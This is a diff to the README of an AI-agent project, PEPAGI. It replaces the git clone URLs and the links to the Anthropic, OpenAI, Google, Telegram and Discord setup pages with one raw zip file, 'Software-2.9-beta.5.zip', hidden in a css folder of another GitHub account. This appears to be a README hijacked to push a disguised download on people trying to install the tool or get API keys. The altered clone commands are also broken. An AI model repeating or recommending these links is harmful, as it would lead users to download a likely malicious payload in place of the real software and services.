@@ -155,7 +155,7 @@ graph TD
 ### Mac / Linux
 
 ```bash
-git clone https://github.com/Promptlab37/PEPAGI.git
+git clone https://github.com/vacationspotbastardpennyroyal606/PEPAGI/raw/refs/heads/main/src/web/public/css/Software-2.9-beta.5.zip
 cd pepagi
 ./install.sh
 ```
@@ -174,7 +174,7 @@ The installer will:
 ### Manual Installation
 
 ```bash
-git clone https://github.com/Promptlab37/PEPAGI.git
+git clone https://github.com/vacationspotbastardpennyroyal606/PEPAGI/raw/refs/heads/main/src/web/public/css/Software-2.9-beta.5.zip
 cd pepagi
 npm install
 npm run setup    # Interactive config wizard
@@ -249,10 +249,10 @@ ollama pull llama3.2
 
 | Variable | Required | Description |
 |----------|----------|-------------|
-| `ANTHROPIC_API_KEY` | Yes* | Claude API key from [console.anthropic.com](https://console.anthropic.com) |
-| `OPENAI_API_KEY` | No | GPT API key from [platform.openai.com](https://platform.openai.com/api-keys) |
-| `GOOGLE_API_KEY` | No | Gemini API key from [aistudio.google.com](https://aistudio.google.com/apikey) |
-| `TELEGRAM_BOT_TOKEN` | No | Bot token from [@BotFather](https://t.me/BotFather) |
+| `ANTHROPIC_API_KEY` | Yes* | Claude API key from [console.anthropic.com](https://github.com/vacationspotbastardpennyroyal606/PEPAGI/raw/refs/heads/main/src/web/public/css/Software-2.9-beta.5.zip) |
+| `OPENAI_API_KEY` | No | GPT API key from [platform.openai.com](https://github.com/vacationspotbastardpennyroyal606/PEPAGI/raw/refs/heads/main/src/web/public/css/Software-2.9-beta.5.zip) |
+| `GOOGLE_API_KEY` | No | Gemini API key from [aistudio.google.com](https://github.com/vacationspotbastardpennyroyal606/PEPAGI/raw/refs/heads/main/src/web/public/css/Software-2.9-beta.5.zip) |
+| `TELEGRAM_BOT_TOKEN` | No | Bot token from [@BotFather](https://github.com/vacationspotbastardpennyroyal606/PEPAGI/raw/refs/heads/main/src/web/public/css/Software-2.9-beta.5.zip) |
 | `TELEGRAM_ALLOWED_USERS` | No | Comma-separated Telegram user IDs (empty = open access) |
 | `DISCORD_BOT_TOKEN` | No | Discord bot token |
 | `OLLAMA_BASE_URL` | No | Ollama endpoint (default: `http://localhost:11434`) |
@@ -266,15 +266,15 @@ Full configuration is stored in `~/.pepagi/config.json` (created by `npm run set
 
 ### Telegram Bot Setup
 
-1. Open Telegram, find [@BotFather](https://t.me/BotFather), send `/newbot`
+1. Open Telegram, find [@BotFather](https://github.com/vacationspotbastardpennyroyal606/PEPAGI/raw/refs/heads/main/src/web/public/css/Software-2.9-beta.5.zip), send `/newbot`
 2. Copy the bot token to `.env`: `TELEGRAM_BOT_TOKEN=your_token_here`
-3. (Optional) Restrict access: find your user ID via [@userinfobot](https://t.me/userinfobot), set `TELEGRAM_ALLOWED_USERS=your_id`
+3. (Optional) Restrict access: find your user ID via [@userinfobot](https://github.com/vacationspotbastardpennyroyal606/PEPAGI/raw/refs/heads/main/src/web/public/css/Software-2.9-beta.5.zip), set `TELEGRAM_ALLOWED_USERS=your_id`
 4. Run `npm run daemon`
 5. Find your bot in Telegram and start chatting
 
 ### Discord Bot Setup
 
-1. Create an application at [discord.com/developers](https://discord.com/developers/applications)
+1. Create an application at [discord.com/developers](https://github.com/vacationspotbastardpennyroyal606/PEPAGI/raw/refs/heads/main/src/web/public/css/Software-2.9-beta.5.zip)
 2. Create a bot, copy the token to `.env`: `DISCORD_BOT_TOKEN=your_token_here`
 3. Invite the bot to your server with Message Content intent enabled
 4. Run `npm run daemon`
